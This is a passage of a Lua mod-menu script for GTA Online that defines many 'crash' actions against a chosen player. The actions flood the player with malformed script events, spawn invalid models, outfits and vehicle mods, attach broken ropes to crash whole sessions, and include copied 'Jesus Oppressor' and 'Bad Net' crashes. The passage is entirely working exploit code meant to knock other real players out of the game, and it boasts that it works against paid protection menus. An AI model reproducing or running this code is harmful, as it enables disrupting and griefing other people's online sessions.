            util.trigger_script_event(1 << pid, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << pid, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << pid, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << pid, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << pid, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << pid, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << pid, {1480548969, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << pid, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << pid, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << pid, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
            util.trigger_script_event(1 << pid, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
            util.trigger_script_event(1 << pid, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
            util.trigger_script_event(1 << pid, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
            util.trigger_script_event(1 << pid, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
            util.trigger_script_event(1 << pid, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
            util.trigger_script_event(1 << pid, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
            util.trigger_script_event(1 << pid, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
            util.trigger_script_event(1 << pid, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
            util.trigger_script_event(1 << pid, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
            util.trigger_script_event(1 << pid, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
            util.trigger_script_event(1 << pid, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
            util.trigger_script_event(1 << pid, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
            util.trigger_script_event(1 << pid, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
            util.trigger_script_event(1 << pid, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
            util.trigger_script_event(1 << pid, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
            util.trigger_script_event(1 << pid, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
            util.trigger_script_event(1 << pid, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
            util.trigger_script_event(1 << pid, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
            util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
            util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
            util.trigger_script_event(1 << pid, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
    end)

    menu.action(ryzecrash, "Script crash 10", {"scrashv11"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
            util.trigger_script_event(1 << pid, {-555356783,1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << pid, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
            util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
            util.trigger_script_event(1 << pid, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
            util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
            util.trigger_script_event(1 << pid, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(ryzecrash, "Script crash 11", {"scrashv12"}, "", function()
        for i = 1, 50 do
            util.trigger_script_event(1 << pid, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
            util.trigger_script_event(1 << pid, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
            util.trigger_script_event(1 << pid, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
        end
    end)

    menu.action(ryzecrash, "Script crash 12", {"scrashv13"}, "", function()
        util.trigger_script_event(1 << pid, {-2043109205, 0, 0, 17302, 9822, 1999, 6777888, 111222})
        util.trigger_script_event(1 << pid, {-2043109205, 0, 0, 2327, 0, 0, 0, -307, 27777})
        util.trigger_script_event(1 << pid, {-988842806, 0, 0, 2327, 0, 0, 0, -307, 27777})
        util.trigger_script_event(1 << pid, {-2043109205, 0, 0, 27983, 7601, 1020, 3209051, 111222})
        util.trigger_script_event(1 << pid, {-2043109205, 0, 0, 1010, 0, 0, 0, -2653, 50555})
        util.trigger_script_event(1 << pid, {-988842806, 0, 0, 1111, 0, 0, 0, -5621, 57766})
        util.trigger_script_event(1 << pid, {-988842806, 0, 0, -3, -90, -123, -9856, -97652})
        util.trigger_script_event(1 << pid, {-2043109205, 0, 0, -3, -90, -123, -9856, -97652})
        util.trigger_script_event(1 << pid, {-1881357102, 0, 0, -3, -90, -123, -9856, -97652})
        util.trigger_script_event(1 << pid, {-988842806, 0, 0, 20547, 1058, 1245, 2721936, 666333})
        util.yield(25)
        util.trigger_script_event(1 << pid, {-2043109205, 0, 0, 20547, 1058, 1245, 2721936, 666333})
        util.trigger_script_event(1 << pid, {-1881357102, 0, 0, 20547, 1058, 1245, 2721936, 666333})
        util.trigger_script_event(1 << pid, {153488394, 0, 868904806, 0, 0, -152, -123, -978, 0, 0, 1, 0, -167, -144})
        util.trigger_script_event(1 << pid, {153488394, 0, 868904806, 0, 0, 152, 123, 978, 0, 0, 1, 0, 167, 144})
        util.trigger_script_event(1 << pid, {1249026189, 0, 0, 97587, 5697, 3211, 8237539, 967853})
        util.trigger_script_event(1 << pid, {1033875141, 0, 0, 0, 1967})
        util.trigger_script_event(1 << pid, {1033875141, 0, 0, -123, -957, -14, -1908, -123})
        util.trigger_script_event(1 << pid, {1033875141, 0, 0, 12121, 9756, 7609, 1111111, 789666})
        util.trigger_script_event(1 << pid, {315658550, 0, 0, 87111, 5782, 9999, 3333333, 888888})
        util.trigger_script_event(1 << pid, {-877212109, 0, 0, 87111, 5782, 9999, 3333333, 888888})
        util.trigger_script_event(1 << pid, {1926582096, 0, -1, -1, -1, 18899, 1011, 3070})
        util.trigger_script_event(1 << pid, {1926582096, 0, -4640169, 0, 0, 0, -36565476, -53105203})
        util.trigger_script_event(1 << pid, {1033875141, -17645264, -26800537, -66094971, -45281983, -24450684, -13000488, 59643555, 34295654, 91870118, -3283691})
        util.trigger_script_event(1 << pid, {-988842806, 0, 0, 93})
        util.yield(25)
        util.trigger_script_event(1 << pid, {-2043109205, 0, 0, 37, 0, -7})
        util.trigger_script_event(1 << pid, {-1881357102, 0, 0, -13, 0, 0, 0, 23})
        util.trigger_script_event(1 << pid, {153488394, 0, 868904806, 0, 0, 7, 7, 19, 0, 0, 1, 0, -23, -27})
        util.trigger_script_event(1 << pid, {1249026189})
        util.trigger_script_event(1 << pid, {315658550})
        util.trigger_script_event(1 << pid, {-877212109})
        util.trigger_script_event(1 << pid, {1033875141, 0, 0, 0, 82})
        util.trigger_script_event(1 << pid, {1926582096})
        util.trigger_script_event(1 << pid, {-977515445, 26770, 95398, 98426, -24591, 47901, -64814})
        util.trigger_script_event(1 << pid, {-1949011582, -1139568479, math.random(0, 4), math.random(0, 1)})
        util.yield(25)
        util.trigger_script_event(1 << pid, {-2043109205, 0, 0, 3333, 0, 0, 0, -987, 21369})
        util.trigger_script_event(1 << pid, {-988842806, 0, 0, 2222, 0, 0, 0, -109, 73322})
        util.trigger_script_event(1 << pid, {-977515445, 26770, 95398, 98426, -24591, 47901, -64814})
        util.trigger_script_event(1 << pid, {-1949011582, -1139568479, math.random(0, 4), math.random(0, 1)})
        util.trigger_script_event(1 << pid, {-1730227041, -494, 1526, 60541, -12988, -99097, -32105})
    end)

    menu.action(ryzecrash,"Script Crash V13", {""} ,"" , function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local allvehicles = entities.get_all_vehicles_as_handles()
        for i = 1, 3 do
            for i = 1, #allvehicles do
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
                util.yield()
            end
        end
        util.trigger_script_event(1 << pid,{526822748,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{-555356783,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{-1390976345,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{-637352381,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{-1529596656,pid, 1, 0, 2, 0, 3, 30583, 4, 0, 5, 0, 6, 0, 7 -328966, 8, 1132039228, 9, 0})
        util.trigger_script_event(1 << pid,{-1991423686,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{1992522613,pid, 1, 0, 2, 0, 3, 30583, 4, 0, 5, 0, 6, 0, 7 -328966, 8, 1132039228, 9, 0})
        util.trigger_script_event(1 << pid,{-714268990,pid, 1, 0, 2, 0, 3, 30583, 4, 0, 5, 0, 6, 0, 7 -328966, 8, 1132039228, 9, 0})
        util.trigger_script_event(1 << pid,{495813132,pid, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 1754244778, 10, 23135423, 11, 827870001, 12, 23135423})
        util.trigger_script_event(1 << pid,{-1247985006,pid, 0, 2, 1, 3, 1, 4, 1841685865, 5, 136236, 6, 27769, 7, -1450989833, 8, -2082595, 9, 1587193, 10, -6701543, 11, 147649, 12, 651264, 13, -2507024, 14, 11951923, 15, -833146974, 16, -1799182, 17, 2359273, 18, 4959292, 19, 1})
        util.trigger_script_event(1 << pid,{526822748,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -17898883})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 17398799})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 15576064})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -13128205})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -10321649})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 9846577})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 15098687})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 15098687})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 21062401})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -5065659})
        util.trigger_script_event(1 << pid,{1348481963,pid,  0, 2, 378775})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 9497036})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 8067058})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -3322411})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -17851944})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -18386240})
        util.trigger_script_event(1 << pid,{-634789188,pid, 0, 2, -634789188})
        util.trigger_script_event(1 << pid,{-634789188,pid, 0, 2, -634789188})
        util.trigger_script_event(1 << pid,{-668341698,pid, 0, 2, -668341698})
        util.trigger_script_event(1 << pid, {1214823473, pid, 0, 0, 0, 0, 0})
        util.trigger_script_event(1 << pid, {2130458390, pid, 0, 1, 0, 0, 0})
    end)

    menu.action(ryzecrash, "Script Crash V14", {}, "5G?", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local allvehicles = entities.get_all_vehicles_as_handles()
        for i = 1, 3 do
            for i = 1, #allvehicles do
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
                util.yield()
            end
        end
    end)


    local mcrashes = menu.list(ryzecrash, "Model Crashes", {}, "Will work for some of the menus including paid ones.")

    menu.action(mcrashes, "Invalid Model V6", {"mcrashv6"}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local hash = util.joaat("cs_taostranslator2")
        while not STREAMING.HAS_MODEL_LOADED(hash) do
            STREAMING.REQUEST_MODEL(hash)
            util.yield(5)
        end
        --coord.z -= 1
        local ped = {}
        for i = 0, 10 do
            local coord = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(mvped, 0.0, 5.0, 0.0)
            ped[i] = entities.create_ped(0, hash, coord, 0)
            local pedcoord = ENTITY.GET_ENTITY_COORDS(ped[i], false)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped[i], 0xB1CA77B1, 0, true)
            WEAPON.SET_PED_GADGET(ped[i], 0xB1CA77B1, true)
            --FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pedcoord.x, pedcoord.y, pedcoord.z, 5, 10, false, false, 0)
            menu.trigger_commands("as ".. PLAYER.GET_PLAYER_NAME(pid) .. " explode " .. PLAYER.GET_PLAYER_NAME(pid) .. " ")
            ENTITY.SET_ENTITY_VISIBLE(ped[i], false)
        util.yield(25)
        end
        util.yield(2500)
        for i = 0, 10 do
            entities.delete_by_handle(ped[i])
            util.yield(10)
        end

    end)

    menu.action(mcrashes, "Invalid Vehicle Data", {}, "", function()
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        local sentinel = util.joaat("sentinel")
    
        STREAMING.REQUEST_MODEL(sentinel)
        while not STREAMING.HAS_MODEL_LOADED(sentinel) do
            util.yield()
        end
    
        local vehicle = entities.create_vehicle(sentinel, pos, 0)
        VEHICLE.SET_VEHICLE_MOD(vehicle, 34, 3, false)
        util.yield(1000)
        entities.delete_by_handle(vehicle)
    end)


    local sscrashes = menu.list(ryzecrash, "Session Crashes", {}, "Crash session")

    menu.action(sscrashes, "Crash Session V1", {"sscrashv1"}, "", function(on_loop)
        PHYSICS.ROPE_LOAD_TEXTURES()
        local hashes = {2132890591, 2727244247}
        local pc = players.get_position(pid)
        local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pc.x + 5, pc.y, pc.z, 0, true, true, false)
        local ped = PED.CREATE_PED(26, hashes[2], pc.x, pc.y, pc.z + 1, 0, true, false)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
        ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
        ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
        local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
        local vehc = ENTITY.GET_ENTITY_COORDS(veh); local pedc = ENTITY.GET_ENTITY_COORDS(ped)
        PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
        util.yield(1000)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
        entities.delete_by_handle(veh); entities.delete_by_handle(ped)
        PHYSICS.DELETE_CHILD_ROPE(rope)
        PHYSICS.ROPE_UNLOAD_TEXTURES()
    end)

    menu.action(sscrashes, "Crash Session V2", {"sscrashv2"}, "", function(on_loop)
        PHYSICS.ROPE_LOAD_TEXTURES()
        local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        local ppos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        pos.x = pos.x+5
        ppos.z = ppos.z+1
        cargobob = entities.create_vehicle(2132890591, pos, 0)
        cargobob_pos = ENTITY.GET_ENTITY_COORDS(cargobob)
        kur = entities.create_ped(26, 2727244247, ppos, 0)
        kur_pos = ENTITY.GET_ENTITY_COORDS(kur)
        ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
        newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
        PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, kur, cargobob_pos.x, cargobob_pos.y, cargobob_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center")
    end)

    menu.action(ryzecrash, "Vehicle Temp Action 5G", {""}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player, false)
        local my_pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        local my_ped = PLAYER.GET_PLAYER_PED(players.user())
        pos.z = pos.z - 50
    
        BlockSyncs(pid, function()
            menu.trigger_commands("invisibility on")
            menu.trigger_commands("otr")
    
            ENTITY.FREEZE_ENTITY_POSITION(my_ped, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, pos.x, pos.y, pos.z, false, false, false)
            util.yield()
            local allvehicles = entities.get_all_vehicles_as_handles()
            for i = 1, #allvehicles do
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
            end
            util.yield()
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos.x, my_pos.y, my_pos.z, false, false, false)
            ENTITY.FREEZE_ENTITY_POSITION(my_ped, false)
            menu.trigger_commands("invisibility off")
            menu.trigger_commands("otr")
        end)
    end)

    menu.action(ryzecrash, "Invalid Outfit Compenents", {}, "", function()
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        while not STREAMING.HAS_MODEL_LOADED(0x0D7114C9) do
            STREAMING.REQUEST_MODEL(0x0D7114C9)
            util.yield()
        end
    
        local michael = entities.create_ped(0, 0x0D7114C9, pos, 0)
        for i = 1, 20 do
            PED.SET_PED_COMPONENT_VARIATION(michael, 0, 0, 8, 0)
            PED.SET_PED_COMPONENT_VARIATION(michael, 0, 0, 9, 0)
            util.yield()
        end
        util.yield(500)
        ENTITY.SET_ENTITY_COORDS(michael, pos.x, pos.y, pos.z, true, false, false, true)
        util.yield(500)
        entities.delete_by_handle(michael)
    end)

    local ents = {}
    local thingy = false
    menu.toggle(ryzecrash, "Muscle Crash", {}, "", function(val,cl)
        thingy = val
        BlockSyncs(pid, function()
            if val then
                local number_of_things = 30
                local ped_mdl = util.joaat("ig_siemonyetarian")
                local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local ped_pos = ENTITY.GET_ENTITY_COORDS(ply_ped)
                ped_pos.z += 3
                request_model(ped_mdl)
                for i=1,number_of_things do
                    local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                    ents[i] = ped
                    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                    ENTITY.SET_ENTITY_VISIBLE(ped, false)
                end
                repeat
                    for k, ped in ents do
                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(ped, "PROP_HUMAN_SEAT_MUSCLE_BENCH_PRESS", 0, false)
                       
                        
                       
                    end
                    for k, v in entities.get_all_objects_as_pointers() do
                        if entities.get_model_hash(v) == util.joaat("ig_siemonyetarian") then
                            
                            
                     
                            entities.delete_by_pointer(v)
                        end
                    end
                   
                        
                    
                    util.yield_once()
                    util.yield_once()
                until not (thingy and players.exists(pid))
                thingy = false
                for k, obj in ents do
                    entities.delete_by_handle(obj)
                end
                ents = {}
            else
                for k, obj in ents do
                    entities.delete_by_handle(obj)
                end
                ents = {}
            end
        end)
    end)

local jesuscrash = menu.list(Removals_List, "Jesus Oppressor Crash", {}, "")

menu.action(jesuscrash, "Jesus Oppressor Crash", {"jesusoppressor"}, "Causes (A2:456) Events. Skid from x-force re-coded by Picoles (RyzeScript).", function()
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(pid)
    local mdl = util.joaat("u_m_m_jesus_01")
    local veh_mdl = util.joaat("oppressor")
    util.request_model(veh_mdl)
    util.request_model(mdl)
                    local veh = entities.create_vehicle(veh_mdl, pos, 0)
                    local jesus = entities.create_ped(2, mdl, pos, 0)
                    PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
                    util.yield(100)
                    TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
                    util.yield(1000)
                    entities.delete_by_handle(jesus)
                    entities.delete_by_handle(veh)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
end)

    menu.toggle_loop(jesuscrash, "Jesus Oppressor Crash", {"togglejesusoppressor"}, "Causes (A2:456) Events toggled. Skid from x-force re-coded by Picoles (RyzeScript).", function(on_toggle)
    if on_toggle then
        menu.trigger_commands("jesusoppressor" .. PLAYER.GET_PLAYER_NAME(pids))
    else
        menu.trigger_commands("jesusoppressor" .. PLAYER.GET_PLAYER_NAME(pids))
        end
    end)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

    	local keramicrash = menu.list(Removals_List, "Kerami Crashes", {}, "")

menu.toggle_loop(keramicrash, "Bad Net Crash", {"badnet"}, "Skidded from kerami script.", function(on_toggle)
    notification("Badnet Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
    local vehicles = {}
    for i = 1, 4 do
        util.create_thread(function()
            request_model(hashes[i])
            local pcoords = getEntityCoords(getPlayerPed(pid))
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1 
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                pcoords = getEntityCoords(getPlayerPed(pid))
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                util.yield()
            end
            vehicles[#vehicles+1] = veh
        end)
    end
    util.yield(2000)
    for _, v in pairs(vehicles) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
        entities.delete_by_handle(v)
		end
